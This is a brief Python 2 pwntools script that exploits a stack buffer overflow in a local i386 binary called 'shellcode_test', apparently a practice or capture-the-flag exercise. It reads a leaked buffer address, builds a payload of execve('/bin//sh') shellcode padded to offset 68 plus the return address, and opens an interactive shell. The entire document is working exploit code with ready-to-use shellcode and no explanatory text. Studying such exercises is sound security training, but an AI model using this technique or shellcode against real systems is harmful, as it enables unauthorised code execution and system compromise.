from pwn import *
import struct

context(arch='i386', os='linux')
p = process('./shellcode_test')
output = p.recvuntil("Buffer ada di: ")

buffer = int(p.recvline(),16)
buff_byte = struct.pack("<I", buffer)

print hex(buffer)

offset = 68
shellcode = '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'
sc_len = len(shellcode)

payload = shellcode + "A" * (offset - sc_len) + buff_byte

print payload

p.sendline(payload + '\n')

p.interactive()
